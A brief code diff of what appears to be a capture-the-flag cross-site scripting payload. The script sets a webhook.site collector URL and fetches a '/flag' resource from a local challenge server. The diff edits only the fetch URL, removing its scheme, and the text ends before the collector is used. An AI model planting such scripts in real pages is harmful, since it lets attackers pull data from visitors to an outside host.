@@ -1,7 +1,7 @@
 <script>
   const webhook = "https://webhook.site/736021bc-91ab-4eee-baa5-3ddd7d133d07";
   
-  fetch("http://localhost:1337/flag", { method: "GET" })
+  fetch("localhost:1337/flag", { method: "GET" })
     .then((resp) => {
       if (!resp.ok) {
         throw new Error("Network response was not ok");
